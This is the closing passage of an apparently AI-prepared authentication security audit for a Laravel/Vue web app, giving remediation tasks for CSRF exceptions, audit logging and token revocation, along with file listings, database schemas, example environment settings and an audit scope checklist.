// File: server/app/Http/Middleware/VerifyCsrfToken.php
protected $except = [
    '/api/materials/fetch',
    // Удалить: 'api/chrome/*'
    // Добавить специфичные endpoints если нужно:
    // '/api/chrome/auth/token',  // public endpoint
];
```

### Week 2: Audit & Logging

#### Task 2.1: Audit Logging
```php
// Update AuthController, PinAuthController with:
AdminAuditLog::create([
    'user_id' => $user->id,
    'action' => 'auth.login',
    'ip_address' => $request->ip(),
    'user_agent' => $request->header('User-Agent'),
]);
```

#### Task 2.2: Token Revocation on Password Change
```php
// File: AuthController::changePassword()
$user->tokens()->delete();
DB::table('sessions')->where('user_id', $user->id)->delete();
$user->trustedDevices()->update(['revoked_at' => now()]);
```

#### Task 2.3: Login Notification Email
```php
// Create app/Mail/NewLoginNotification.php
// Send on first session after password reset
```

### Week 3-4: Testing & Validation

- ✅ Тестирование rate limiting
- ✅ Проверка cookie флагов (HttpOnly, Secure, SameSite)
- ✅ Email отправка при забытом пароле
- ✅ CSRF токены работают корректно
- ✅ Логирование в AdminAuditLog

---

## 📚 Приложения

### A. Файлы системы авторизации

#### Backend
```
server/app/Http/Controllers/Api/
├── AuthController.php
├── PinAuthController.php
├── ChromeExtensionController.php
├── PasswordResetController.php
├── PhoneAuthController.php
└── YandexAuthController.php

server/app/Http/Middleware/
├── Authenticate.php
├── EnforceSingleSession.php
└── VerifyCsrfToken.php

server/app/Models/
├── User.php
├── TrustedDevice.php
├── SocialAccount.php
└── AuthVerificationChallenge.php

server/database/migrations/
├── 2026_02_11_000001_add_pin_fields_to_users_table.php
├── 2026_02_11_000002_create_trusted_devices_table.php
├── 2026_03_15_000001_add_phone_auth_fields_to_users_table.php
└── 2026_03_20_000002_add_admin_fields_to_users_table.php

server/config/
├── auth.php
├── session.php
└── mail.php
```

#### Frontend
```
client/src/views/
├── LoginView.vue
└── ResetPasswordView.vue

client/src/components/auth/
├── AuthLogin.vue
├── AuthForgot.vue
├── AuthReset.vue
├── AuthPinLogin.vue
├── AuthPhoneLogin.vue
├── PinSetupDialog.vue
├── PinInput.vue
└── YandexLoginButton.vue

client/src/stores/
└── auth.ts

client/src/api/
├── axios.ts
├── auth.ts
└── pin.ts
```

### B. Таблицы БД

#### users
```sql
id, name, email, password, email_verified_at,
remember_token, created_at, updated_at,
-- PIN fields
pin_enabled, pin_hash, pin_changed_at, pin_attempts, pin_locked_until,
current_session_id,
-- Phone fields
full_name, phone, phone_verified_at, activity_profile, 
registration_completed_at, last_login_channel, auth_status
```

#### trusted_devices
```sql
id, user_id, device_id, device_secret_hash, user_agent,
ip_first, ip_last, last_used_at, revoked_at,
created_at, updated_at
```

#### password_reset_tokens
```sql
email, token, created_at
```

#### sessions
```sql
id, user_id, ip_address, user_agent, payload, last_activity
```

### C. Конфигурационные переменные

```env
# Auth
AUTH_GUARD=web
AUTH_PASSWORD_BROKER=users
SESSION_SECURE_COOKIES=false         # true for production
SESSION_LIFETIME=120                 # minutes
SESSION_DOMAIN=.localhost
SESSION_SECURE_COOKIES=false

# Email
MAIL_DRIVER=smtp
MAIL_HOST=smtp.mailtrap.io
MAIL_PORT=587
MAIL_USERNAME=...
MAIL_PASSWORD=...
MAIL_FROM_ADDRESS=noreply@app.com
MAIL_FROM_NAME="Smeta Expert"

# Frontend
APP_FRONTEND_URL=http://localhost:5173
```

---

## 🔍 Процесс аудита безопасности

### Проверки проведены:

1. ✅ Анализ endpoints (существующие, методы, аутентификация)
2. ✅ Проверка хеширования паролей и PIN
3. ✅ Анализ rate limiting
4. ✅ Проверка CSRF, cookies, session security
5. ✅ Анализ logging и audit trail
6. ✅ Проверка email уведомлений

### Что НЕ проверялось (требуется ручная аудит):

- 🔴 Тестирование в production среде
- 🔴 Проверка firewall правил
- 🔴 Анализ DDoS protection
- 🔴 SQL injection / NoSQL injection
- 🔴 XSS уязвимости (требуется SAST)
- 🔴 Dependency vulnerabilities (требуется dependency scan)

---

## 📞 Контакты и вопросы

При возникновении вопросов:
1. Проверить версию в `server/app/Http/Controllers/Api/AuthController.php`
2. Запустить тесты: `php artisan test --filter=Auth`
3. Проверить логи: `storage/logs/laravel.log`

---

**Отчет подготовлен:** GitHub Copilot  
**Версия:** 2.0  
**Последнее обновление:** 7 апреля 2026  
**Статус:** ✅ Ready for Implementation
